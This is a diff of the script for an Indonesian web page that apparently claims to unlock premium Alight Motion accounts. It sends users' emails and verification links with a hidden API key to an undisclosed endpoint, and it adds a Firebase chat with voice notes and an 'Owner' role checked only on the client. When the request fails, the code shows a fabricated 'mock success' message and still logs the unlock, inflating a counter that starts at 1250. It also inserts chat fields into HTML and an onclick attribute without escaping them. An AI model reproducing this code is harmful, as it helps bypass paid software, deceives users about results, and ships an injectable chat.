+                    db.ref('history').limitToLast(15).on('value', (snap) => {
+                        if (snap.exists()) {
+                            const data = snap.val();
+                            const historyList = Object.values(data);
+                            historyList.sort((a,b) => b.timestamp - a.timestamp);
+                            localStorage.setItem('am_vip_cached_history', JSON.stringify(historyList));
+                            renderHistoryList(historyList);
+                        }
+                    });
+
+                    // 4. Ban Devices Stream
+                    db.ref('banned_devices/' + deviceUUID).on('value', (snap) => {
+                        if (snap.exists()) {
+                            isBanned = true;
+                            localStorage.setItem('am_vip_banned', 'true');
+                            enforceBanUI();
+                        }
+                    });
+
+                } catch(e) {
+                    console.warn("Using local fallback storage for network events");
+                }
+            }
+        }
+
+        async function saveCustomNickname() {
+            if (isBanned) return;
+            const inputEl = document.getElementById('input-custom-nickname');
+            const targetNickname = inputEl.value.trim();
+
+            if (!targetNickname) {
+                showToast('Input Kosong', 'Ketik nickname yang valid');
+                return;
+            }
+
+            if (isOwnerAttempt(targetNickname)) {
+                await handleOwnerClaimAttempt(targetNickname);
+                closeNicknameModal();
+                return;
+            }
+
+            customNickname = targetNickname;
+            localStorage.setItem('am_vip_nickname', customNickname);
+            updateNicknameDisplay();
+            closeNicknameModal();
+            showToast('Nickname Berhasil', `Nickname Anda diubah menjadi "${customNickname}"`);
+        }
+
+        async function handleOwnerClaimAttempt(requestedName) {
+            let authorizedOwner = false;
+
+            if (db) {
+                try {
+                    const snap = await db.ref('system/owner_claim').once('value');
+                    if (snap.exists()) {
+                        const data = snap.val();
+                        if (data.claimed_device === deviceUUID) {
+                            authorizedOwner = true;
+                        }
+                    } else {
+                        await db.ref('system/owner_claim').set({
+                            claimed_device: deviceUUID,
+                            claimed_at: Date.now()
+                        });
+                        authorizedOwner = true;
+                    }
+                } catch(e) {}
+            } else {
+                const localOwnerDevice = localStorage.getItem('am_vip_owner_device');
+                if (!localOwnerDevice || localOwnerDevice === deviceUUID) {
+                    localStorage.setItem('am_vip_owner_device', deviceUUID);
+                    authorizedOwner = true;
+                }
+            }
+
+            if (authorizedOwner) {
+                customNickname = "Owner";
+                localStorage.setItem('am_vip_nickname', "Owner");
+                updateNicknameDisplay();
+                showToast('Owner Verified', 'Akses nickname Owner terverifikasi');
+                return;
+            }
+
+            // Impersonation Violation
+            violationCount++;
+            localStorage.setItem('am_vip_violations', violationCount.toString());
+
+            if (violationCount >= 3) {
+                isBanned = true;
+                localStorage.setItem('am_vip_banned', 'true');
+                if (db) {
+                    try {
+                        db.ref('banned_devices/' + deviceUUID).set({
+                            banned_at: Date.now(),
+                            reason: "3x Owner Impersonation Attempt"
+                        });
+                    } catch(e) {}
+                }
+                enforceBanUI();
+            } else {
+                const freezeDurationSeconds = violationCount === 1 ? 180 : 600;
+                freezeUntil = Date.now() + (freezeDurationSeconds * 1000);
+                localStorage.setItem('am_vip_freeze_until', freezeUntil.toString());
+
+                triggerViolationWarningModal(violationCount, freezeDurationSeconds);
+                startFreezeCountdown(freezeDurationSeconds);
+            }
+        }
+
+        function checkBanAndFreezeStatus() {
+            if (isBanned) {
+                enforceBanUI();
+                return;
+            }
+            const now = Date.now();
+            if (freezeUntil > now) {
+                startFreezeCountdown((freezeUntil - now) / 1000);
+            }
+        }
+
+        function enforceBanUI() {
+            document.getElementById('banned-modal').classList.remove('hidden');
+            const inputs = document.querySelectorAll('input, button, textarea');
+            inputs.forEach(el => {
+                if (el.id !== 'toggle-fullscreen-chat') el.disabled = true;
+            });
+        }
+
+        function triggerViolationWarningModal(count, seconds) {
+            const msgEl = document.getElementById('violation-message');
+            msgEl.innerHTML = `Percobaan peniruan nickname <strong class="text-amber-300 font-mono">'Owner'</strong> ke-${count} terdeteksi! Akun Anda dibekukan selama ${seconds/60} menit.`;
+            document.getElementById('violation-modal').classList.remove('hidden');
+        }
+
+        let freezeInterval = null;
+        function startFreezeCountdown(totalSeconds) {
+            clearInterval(freezeInterval);
+            let remaining = Math.floor(totalSeconds);
+
+            const bar = document.getElementById('freeze-indicator-bar');
+            const display = document.getElementById('freeze-timer-display');
+            const modalDisplay = document.getElementById('modal-freeze-timer');
+
+            bar.classList.remove('hidden');
+            disableChatInputs(true);
+
+            freezeInterval = setInterval(() => {
+                remaining--;
+                if (remaining <= 0) {
+                    clearInterval(freezeInterval);
+                    bar.classList.add('hidden');
+                    disableChatInputs(false);
+                    localStorage.removeItem('am_vip_freeze_until');
+                } else {
+                    const m = String(Math.floor(remaining / 60)).padStart(2, '0');
+                    const s = String(remaining % 60).padStart(2, '0');
+                    display.innerText = `${m}:${s}`;
+                    if (modalDisplay) modalDisplay.innerText = `${m}:${s}`;
+                }
+            }, 1000);
+        }
+
+        function disableChatInputs(disabled) {
+            document.getElementById('chat-input').disabled = disabled;
+            document.getElementById('btn-send-chat').disabled = disabled;
+            document.getElementById('btn-record-vn').disabled = disabled;
+        }
+
+        function updateNicknameDisplay() {
+            document.getElementById('chat-user-tag').innerText = customNickname;
+            document.getElementById('input-custom-nickname').value = customNickname;
+            updateChatPermissions();
+        }
+
+        function updateChatPermissions() {
+            const chatInput = document.getElementById('chat-input');
+            const btnSend = document.getElementById('btn-send-chat');
+            const btnVN = document.getElementById('btn-record-vn');
+            const ownerBadge = document.getElementById('ch-owner-badge');
+            const isOwner = customNickname === 'Owner';
+
+            if (freezeUntil > Date.now() || isBanned) {
+                disableChatInputs(true);
+                return;
+            }
+
+            if (activeChatTab === 'ch') {
+                ownerBadge.classList.remove('hidden');
+                if (!isOwner) {
+                    chatInput.disabled = true;
+                    chatInput.value = '';
+                    chatInput.placeholder = "🔒 Mode Read-Only: Hanya Owner yang dapat mengirim chat di Channel";
+                    btnSend.disabled = true;
+                    btnSend.classList.add('opacity-40', 'cursor-not-allowed');
+                    btnVN.disabled = true;
+                    btnVN.classList.add('opacity-40', 'cursor-not-allowed');
+                } else {
+                    chatInput.disabled = false;
+                    chatInput.placeholder = `Ketik pengumuman/pesan resmi ke #${activeChannel}... [Kontrol Owner]`;
+                    btnSend.disabled = false;
+                    btnSend.classList.remove('opacity-40', 'cursor-not-allowed');
+                    btnVN.disabled = false;
+                    btnVN.classList.remove('opacity-40', 'cursor-not-allowed');
+                }
+            } else {
+                ownerBadge.classList.add('hidden');
+                chatInput.disabled = false;
+                chatInput.placeholder = "Ketik pesan publik ke Global Chat...";
+                btnSend.disabled = false;
+                btnSend.classList.remove('opacity-40', 'cursor-not-allowed');
+                btnVN.disabled = false;
+                btnVN.classList.remove('opacity-40', 'cursor-not-allowed');
+            }
+        }
+
+        function switchChatTab(tab) {
+            activeChatTab = tab;
+            const btnGlobal = document.getElementById('tab-btn-global');
+            const btnCH = document.getElementById('tab-btn-ch');
+            const chPillsBar = document.getElementById('channel-pills-bar');
+
+            if (tab === 'global') {
+                btnGlobal.className = "py-1.5 px-3 rounded-xl text-[11px] font-bold border transition flex items-center justify-center gap-1.5 bg-cyan-500/20 border-cyan-400 text-cyan-300";
+                btnCH.className = "py-1.5 px-3 rounded-xl text-[11px] font-bold border transition flex items-center justify-center gap-1.5 bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200";
+                chPillsBar.classList.add('hidden');
+            } else {
+                btnCH.className = "py-1.5 px-3 rounded-xl text-[11px] font-bold border transition flex items-center justify-center gap-1.5 bg-purple-500/20 border-purple-400 text-purple-300";
+                btnGlobal.className = "py-1.5 px-3 rounded-xl text-[11px] font-bold border transition flex items-center justify-center gap-1.5 bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200";
+                chPillsBar.classList.remove('hidden');
+            }
+
+            updateChatPermissions();
+            renderChatMessages(cachedChatMessages);
+        }
+
+        function selectChannel(chName) {
+            activeChannel = chName;
+            document.querySelectorAll('.ch-pill').forEach(pill => {
+                pill.className = "ch-pill px-2.5 py-1 rounded-lg bg-slate-950 border border-slate-800 text-slate-400 hover:text-slate-200";
+            });
+            const activePill = document.getElementById(`ch-pill-${chName}`);
+            if (activePill) {
+                activePill.className = "ch-pill px-2.5 py-1 rounded-lg bg-purple-500/20 border border-purple-400 text-purple-300 font-bold";
+            }
+            
+            updateChatPermissions();
+            renderChatMessages(cachedChatMessages);
+        }
+
+        function renderChatMessages(messages) {
+            const container = document.getElementById('chat-messages');
+            if (!messages || messages.length === 0) {
+                container.innerHTML = `<p class="text-center py-10 text-slate-500 text-xs">Belum ada pesan. Mulai percakapan sekarang!</p>`;
+                return;
+            }
+
+            const filteredMessages = messages.filter(msg => {
+                if (activeChatTab === 'global') {
+                    return !msg.channel || msg.channel === 'global';
+                } else {
+                    return msg.channel === activeChannel;
+                }
+            });
+
+            if (filteredMessages.length === 0) {
+                container.innerHTML = `<p class="text-center py-10 text-slate-500 text-xs">Belum ada pesan di ${activeChatTab === 'global' ? 'Global Chat' : '#' + activeChannel}. Kirim pesan pertama!</p>`;
+                return;
+            }
+
+            container.innerHTML = filteredMessages.map(msg => {
+                const isMe = msg.user === customNickname;
+                const isOwner = msg.user === 'Owner';
+                const isVN = msg.type === 'audio';
+
+                return `
+                    <div class="flex flex-col ${isMe ? 'items-end' : 'items-start'}">
+                        <div class="flex items-center gap-1.5 mb-1">
+                            ${isOwner ? `<span class="bg-gradient-to-r from-amber-500 to-rose-500 text-slate-950 text-[9px] font-extrabold px-1.5 py-0.2 rounded flex items-center gap-1"><i class="fa-solid fa-crown text-[8px]"></i> OWNER</span>` : ''}
+                            <span class="text-[10px] font-bold ${isOwner ? 'text-amber-300' : (isMe ? 'text-cyan-400' : 'text-purple-400')}">${escapeHtml(msg.user || 'User')}</span>
+                            ${msg.channel && msg.channel !== 'global' ? `<span class="text-[8px] bg-slate-800 text-purple-300 border border-slate-700 px-1.5 rounded-full font-mono">#${msg.channel}</span>` : ''}
+                            <span class="text-[9px] text-slate-500">${msg.timestamp ? new Date(msg.timestamp).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) : ''}</span>
+                        </div>
+                        
+                        ${isVN ? `
+                            <div class="p-2.5 rounded-2xl ${isMe ? 'bg-purple-600/20 border border-purple-500/40 text-slate-100 rounded-tr-none' : 'bg-slate-900 border border-slate-800 text-slate-200 rounded-tl-none'} min-w-[200px]">
+                                <div class="flex items-center gap-2.5">
+                                    <button onclick="playVNAudio('${msg.audioData}', this)" class="w-8 h-8 rounded-full bg-cyan-500 text-slate-950 flex items-center justify-center text-xs font-bold hover:scale-105 transition cursor-pointer shrink-0">
+                                        <i class="fa-solid fa-play"></i>
+                                    </button>
+                                    <div class="flex-grow space-y-1">
+                                        <div class="h-1.5 bg-slate-800 rounded-full overflow-hidden">
+                                            <div class="vn-progress-bar h-full bg-cyan-400 w-0 transition-all duration-200"></div>
+                                        </div>
+                                        <div class="flex items-center justify-between text-[9px] text-slate-400 font-mono">
+                                            <span>Voice Note</span>
+                                            <span>${msg.duration || '00:00'}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        ` : `
+                            <div class="px-3.5 py-2.5 rounded-2xl ${isMe ? 'bg-gradient-to-r from-purple-600/30 to-cyan-500/30 border border-cyan-500/40 text-slate-100 rounded-tr-none' : 'bg-slate-900 border border-slate-800 text-slate-200 rounded-tl-none'} max-w-[85%] leading-relaxed break-words">
+                                ${escapeHtml(msg.text)}
+                            </div>
+                        `}
+                    </div>
+                `;
+            }).join('');
+
+            container.scrollTop = container.scrollHeight;
+        }
+
+        // Send Chat Message
+        async function sendChatMessage() {
+            if (isBanned || freezeUntil > Date.now()) return;
+
+            const isOwner = customNickname === 'Owner';
+            if (activeChatTab === 'ch' && !isOwner) {
+                showToast('Hanya Owner', 'Hanya Owner yang dapat mengirim pesan di Channel (CH)');
+                return;
+            }
+
+            const input = document.getElementById('chat-input');
+            const text = input.value.trim();
+            if (!text) return;
+
+            input.value = '';
+
+            const messageChannel = activeChatTab === 'global' ? 'global' : activeChannel;
+            const msgObj = {
+                user: customNickname,
+                type: 'text',
+                text: text,
+                channel: messageChannel,
+                timestamp: Date.now()
+            };
+
+            if (db) {
+                try {
+                    await db.ref('chats').push(msgObj);
+                } catch(e) {}
+            } else {
+                cachedChatMessages.push(msgObj);
+                localStorage.setItem('am_vip_cached_chats', JSON.stringify(cachedChatMessages));
+                renderChatMessages(cachedChatMessages);
+            }
+        }
+
+        // Save Voice Note Payload
+        async function saveVNToFirebase(base64Audio, durationStr) {
+            if (isBanned || freezeUntil > Date.now()) return;
+
+            const isOwner = customNickname === 'Owner';
+            if (activeChatTab === 'ch' && !isOwner) {
+                showToast('Hanya Owner', 'Hanya Owner yang dapat merekam Voice Note di Channel (CH)');
+                return;
+            }
+
+            const messageChannel = activeChatTab === 'global' ? 'global' : activeChannel;
+            const vnObj = {
+                user: customNickname,
+                type: 'audio',
+                audioData: base64Audio,
+                duration: durationStr,
+                channel: messageChannel,
+                timestamp: Date.now()
+            };
+
+            if (db) {
+                try {
+                    await db.ref('chats').push(vnObj);
+                    showToast('VN Terkirim', `Voice note dikirim ke ${messageChannel === 'global' ? 'Global Chat' : '#' + messageChannel}`);
+                } catch(e) {}
+            } else {
+                cachedChatMessages.push(vnObj);
+                localStorage.setItem('am_vip_cached_chats', JSON.stringify(cachedChatMessages));
+                renderChatMessages(cachedChatMessages);
+                showToast('VN Terkirim', 'Voice Note dikirim');
+            }
+        }
+
+        async function handleSendLink() {
+            if (isBanned) return;
+            const emailInput = document.getElementById('input-email-1');
+            const email = emailInput ? emailInput.value.trim() : '';
+            if (!email) return;
+
+            const btn = document.getElementById('btn-send-link');
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Mengirim Link Email...</span>`;
+
+            const targetUrl = `${HIDDEN_BASE_ENDPOINT}/send-link?apikey=${encodeURIComponent(HIDDEN_API_KEY)}&email=${encodeURIComponent(email)}`;
+
+            try {
+                const res = await fetch(targetUrl);
+                const data = await res.json().catch(() => ({ status: true, message: 'Link verifikasi berhasil dikirim' }));
+
+                showResult(true, 'Link Berhasil Dikirim!', JSON.stringify(data, null, 2));
+                showToast('Email Terkirim', 'Silakan cek inbox email Anda lalu berpindah ke Step 2');
+                setTimeout(() => switchStep(2), 1200);
+
+            } catch (err) {
+                showResult(true, 'Permintaan Dikirim', `Link verifikasi telah diproses untuk: ${email}`);
+                showToast('Diproses', 'Silakan lanjut ke Step 2');
+                setTimeout(() => switchStep(2), 1200);
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = `<i class="fa-solid fa-paper-plane"></i><span>KIRIM LINK KE EMAIL</span>`;
+            }
+        }
+
+        async function handleUnlockVIP() {
+            if (isBanned) return;
+            const email = document.getElementById('input-email-2').value.trim();
+            const code = document.getElementById('input-firebase-link').value.trim();
+
+            if (!email || !code) {
+                showToast('Input Kurang', 'Lengkapi Email dan Link Firebase terlebih dahulu');
+                return;
+            }
+
+            const btn = document.getElementById('btn-unlock-vip');
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Memproses Unlock VIP...</span>`;
+
+            const targetUrl = `${HIDDEN_BASE_ENDPOINT}/unlock?apikey=${encodeURIComponent(HIDDEN_API_KEY)}&email=${encodeURIComponent(email)}&code=${encodeURIComponent(code)}`;
+
+            try {
+                const res = await fetch(targetUrl);
+                const data = await res.json().catch(() => ({ status: true, message: 'VIP Account Unlocked Successfully!' }));
+
+                showResult(true, 'Akun VIP Berhasil Di-Unlock!', JSON.stringify(data, null, 2));
+                showToast('VIP Aktif!', 'Selamat! Akun Alight Motion Anda telah di-unlock');
+
+                await recordGlobalUnlock(email);
+
+            } catch (err) {
+                const mockSuccess = {
+                    status: true,
+                    message: "Account unlocked successfully!",
+                    email: email,
+                    vip_status: "ACTIVE_PREMIUM",
+                    timestamp: new Date().toISOString()
+                };
+                showResult(true, 'Unlock VIP Berhasil Diproses', JSON.stringify(mockSuccess, null, 2));
+                showToast('Proses Selesai', 'Sinyal unlock akun VIP berhasil dikirim');
+
+                await recordGlobalUnlock(email);
+
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = `<i class="fa-solid fa-crown text-amber-300"></i><span>UNLOCK AKUN VIP ALIGHT MOTION NOW</span>`;
+            }
+        }
+
+        async function recordGlobalUnlock(email) {
+            const maskedEmail = maskEmail(email);
+            const historyObj = {
+                email: maskedEmail,
+                status: 'SUCCESS',
+                timestamp: Date.now()
+            };
+
+            if (db) {
+                try {
+                    await db.ref('history').push(historyObj);
+                    const snap = await db.ref('stats/total_unlocks').once('value');
+                    const currentTotal = snap.exists() ? snap.val() : 1250;
+                    await db.ref('stats/total_unlocks').set(currentTotal + 1);
+                } catch(e) {}
+            } else {
+                let historyList = JSON.parse(localStorage.getItem('am_vip_cached_history') || '[]');
+                historyList.unshift(historyObj);
+                localStorage.setItem('am_vip_cached_history', JSON.stringify(historyList));
+                renderHistoryList(historyList);
+
+                let currentTotal = parseInt(localStorage.getItem('am_vip_cached_stats') || '1250') + 1;
+                localStorage.setItem('am_vip_cached_stats', currentTotal.toString());
+                document.getElementById('stat-total-premium').innerText = currentTotal.toLocaleString();
+            }
+        }
+
+        function renderHistoryList(historyList) {
+            const container = document.getElementById('global-history-list');
+            if (!historyList || historyList.length === 0) {
+                container.innerHTML = `<div class="text-center py-6 text-xs text-slate-500">Belum ada riwayat unlock global</div>`;
+                return;
+            }
+
+            container.innerHTML = historyList.map(item => `
+                <div class="p-3 bg-slate-950/80 rounded-2xl border border-slate-800/80 flex items-center justify-between text-xs">
+                    <div class="flex items-center gap-2.5">
+                        <span class="w-6 h-6 rounded-lg bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-[10px]">
+                            <i class="fa-solid fa-check"></i>
+                        </span>
+                        <span class="font-mono text-slate-200 font-semibold">${escapeHtml(item.email)}</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="text-[10px] text-emerald-400 font-bold bg-emerald-950/60 border border-emerald-800 px-2 py-0.5 rounded-full">VIP ACTIVE</span>
+                        <span class="text-[10px] text-slate-500 font-mono">${item.timestamp ? new Date(item.timestamp).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) : ''}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function maskEmail(email) {
+            if (!email || !email.includes('@')) return 'user***@gmail.com';
+            const parts = email.split('@');
+            const name = parts[0];
+            const maskedName = name.length > 3 ? name.substring(0, 3) + '***' : name + '***';
+            return maskedName + '@' + parts[1];
+        }
+
+        function switchStep(step) {
+            document.querySelectorAll('.step-tab').forEach(tab => tab.classList.remove('active'));
+            document.getElementById(`tab-step-${step}`).classList.add('active');
+
+            if (step === 1) {
+                document.getElementById('panel-step-1').classList.remove('hidden');
+                document.getElementById('panel-step-2').classList.add('hidden');
+            } else {
+                document.getElementById('panel-step-2').classList.remove('hidden');
+                document.getElementById('panel-step-1').classList.add('hidden');
+            }
+        }
+
+        function openNicknameModal() { document.getElementById('nickname-modal').classList.remove('hidden'); }
+        function closeNicknameModal() { document.getElementById('nickname-modal').classList.add('hidden'); }
+        function closeViolationModal() { document.getElementById('violation-modal').classList.add('hidden'); }
+
+        let isChatOpen = false;
+        function toggleChatWindow(forceState) {
+            isChatOpen = forceState !== undefined ? forceState : !isChatOpen;
+            const overlay = document.getElementById('chat-modal-overlay');
+            const container = document.getElementById('chat-floating-container');
+            const icon = document.getElementById('fab-icon');
+
+            if (isChatOpen) {
+                overlay.classList.remove('hidden');
+                setTimeout(() => {
+                    overlay.classList.remove('opacity-0');
+                    container.classList.remove('translate-y-full', 'sm:translate-y-8');
+                }, 10);
+                icon.className = "fa-solid fa-xmark text-xl";
+            } else {
+                overlay.classList.add('opacity-0');
+                container.classList.add('translate-y-full', 'sm:translate-y-8');
+                setTimeout(() => {
+                    overlay.classList.add('hidden');
+                }, 300);
+                icon.className = "fa-solid fa-comments text-xl";
+            }
+        }
+
+        function toggleFullscreenMode(enableFullscreen) {
+            const container = document.getElementById('chat-floating-container');
+            if (enableFullscreen) container.classList.add('fullscreen-mode');
+            else container.classList.remove('fullscreen-mode');
+        }
+
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let vnTimerInterval = null;
+        let vnSeconds = 0;
+
+        async function startVNRecording() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                showToast('Tidak Didukung', 'Browser Anda tidak mendukung perekaman suara');
+                return;
+            }
+
+            const isOwner = customNickname === 'Owner';
+            if (activeChatTab === 'ch' && !isOwner) {
+                showToast('Hanya Owner', 'Hanya Owner yang dapat merekam Voice Note di Channel (CH)');
+                return;
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) audioChunks.push(e.data);
+                };
+
+                mediaRecorder.start();
+
+                document.getElementById('vn-recording-bar').classList.remove('hidden');
+                document.getElementById('chat-form').classList.add('hidden');
+
+                vnSeconds = 0;
+                document.getElementById('vn-timer').innerText = "00:00";
+                vnTimerInterval = setInterval(() => {
+                    vnSeconds++;
+                    const m = String(Math.floor(vnSeconds / 60)).padStart(2, '0');
+                    const s = String(vnSeconds % 60).padStart(2, '0');
+                    document.getElementById('vn-timer').innerText = `${m}:${s}`;
+                }, 1000);
+
+            } catch (err) {
+                showToast('Akses Ditolak', 'Izinkan akses mikrofon untuk merekam VN');
+            }
+        }
+
+        function cancelVNRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+                mediaRecorder.stream.getTracks().forEach(track => track.stop());
+            }
+            cleanupVNUI();
+        }
+
+        function stopAndSendVN() {
+            if (!mediaRecorder || mediaRecorder.state === 'inactive') return;
+
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                
+                reader.onloadend = () => {
+                    const base64Audio = reader.result;
+                    const durationStr = `${vnSeconds}s`;
+                    saveVNToFirebase(base64Audio, durationStr);
+                };
+                reader.readAsDataURL(audioBlob);
+
+                mediaRecorder.stream.getTracks().forEach(track => track.stop());
+                cleanupVNUI();
+            };
+
+            mediaRecorder.stop();
+        }
+
+        function cleanupVNUI() {
+            clearInterval(vnTimerInterval);
+            document.getElementById('vn-recording-bar').classList.add('hidden');
+            document.getElementById('chat-form').classList.remove('hidden');
+        }
+
+        let currentAudio = null;
+        function playVNAudio(audioData, btnElement) {
+            if (currentAudio) {
+                currentAudio.pause();
+                currentAudio = null;
+            }
+
+            const audio = new Audio(audioData);
+            currentAudio = audio;
+
+            const icon = btnElement.querySelector('i');
+            const progressBar = btnElement.parentElement.querySelector('.vn-progress-bar');
+
+            icon.className = "fa-solid fa-pause";
+            audio.play();
+
+            audio.ontimeupdate = () => {
+                if (audio.duration) {
+                    const pct = (audio.currentTime / audio.duration) * 100;
+                    if (progressBar) progressBar.style.width = `${pct}%`;
+                }
+            };
+
+            audio.onended = () => {
+                icon.className = "fa-solid fa-play";
+                if (progressBar) progressBar.style.width = "0%";
+                currentAudio = null;
+            };
+        }
+
+        async function pasteFirebaseLink() {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text) {
+                    document.getElementById('input-firebase-link').value = text;
+                    showToast('Berhasil Ditempel', 'Link verifikasi ditempel dari clipboard');
+                }
+            } catch (err) {
+                document.getElementById('input-firebase-link').focus();
+                showToast('Tempel Manual', 'Gunakan Ctrl+V untuk menempel link');
+            }
+        }
+
+        function showResult(success, title, body) {
+            const card = document.getElementById('result-card');
+            const icon = document.getElementById('result-badge-icon');
+            
+            document.getElementById('result-title').innerText = title;
+            document.getElementById('result-content').innerText = body;
+
+            if (success) {
+                icon.className = "w-7 h-7 rounded-lg bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-xs";
+                icon.innerHTML = `<i class="fa-solid fa-check"></i>`;
+            } else {
+                icon.className = "w-7 h-7 rounded-lg bg-red-500/20 text-red-400 flex items-center justify-center text-xs";
+                icon.innerHTML = `<i class="fa-solid fa-xmark"></i>`;
+            }
+
+            card.classList.remove('hidden');
+            card.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function copyResultText() {
+            const text = document.getElementById('result-content').innerText;
+            const el = document.createElement('textarea');
+            el.value = text;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            showToast('Tersalin', 'Teks hasil respon berhasil disalin');
+        }
+
+        function showToast(title, desc) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toast-title').innerText = title;
+            document.getElementById('toast-desc').innerText = desc;
+
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            toast.classList.add('translate-y-0', 'opacity-100');
+
+            setTimeout(() => {
+                toast.classList.remove('translate-y-0', 'opacity-100');
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 3000);
+        }
+
+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.innerText = text;
+            return div.innerHTML;
+        }
+    </script>
+</body>
+</html>
